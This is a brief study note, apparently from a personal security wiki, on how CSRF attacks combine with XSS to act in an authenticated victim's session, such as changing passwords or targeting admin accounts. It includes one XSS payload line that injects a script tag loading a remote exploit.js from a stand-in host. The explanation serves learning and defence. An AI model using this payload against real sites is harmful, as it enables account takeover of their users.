
[[CSRF]] attacks may utilize [[XSS]] vulnerabilities to perform certain queries, and [[API]] calls on a web application that the victim is currently authenticated to.
This allows the attacker to perform:
- Actions as authenticated user.
- Utilize other vulnerabilities to perform the same functions, like HTTP parameters for attacks.

For example, a [[JavaScript]] payload that automatically changes the victim's password to the value set by the attacker. It would use the victim's logged-in session to change their password and then the attacker can log in to the victim's account and control it.

CSRF can also be leveraged to attack admins and gain access to their accounts. Admins usually have access to sensitive functions, which can sometimes be used to attack and gain control over the back-end server (depending on the functionality provided to admins within a given web application). Following this example, instead of using JavaScript code that would return the session cookie, we would load a remote .js (JavaScript) file, as follows:

```html
"><script src=//www.example.com/exploit.js></script>
```

This can be prevented with sanitization and validation or a web application firewall [[WAF]].